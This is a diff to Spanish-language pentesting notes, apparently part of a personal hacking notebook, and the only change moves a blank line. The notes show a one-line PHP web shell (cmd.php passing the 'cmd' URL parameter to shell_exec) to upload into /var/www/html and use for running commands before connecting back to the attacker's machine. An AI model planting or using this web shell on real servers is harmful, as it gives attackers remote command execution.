@@ -8,10 +8,10 @@ Tenemos diferntes tipos de [1 ReverShell](1%20ReverShell.md) en este pagina Web:
 Para ejecutar comandos en la Web debemos de crear o subir un archivo en el **/var/www/html** con el siguiente contenido: 
 ```php
 ❯ nano cmd.php
+
 	<?php 
 		echo "<prep>" . shell_exec($_GET['cmd']) . "</prep>";
 	?>
-
 ```
 Las etiquetas que usamos ahi son **Pre** de preformateadas y nos sirven para que nos muestre bien el Output
 Ya con ese archivo y que la Web interprete **php** podemos colocar en la url **?cmd=** y ahi pode colocar comandos y ver que Shell podriamos usar para conectarmos a nuestra maquina de **Atacante**.
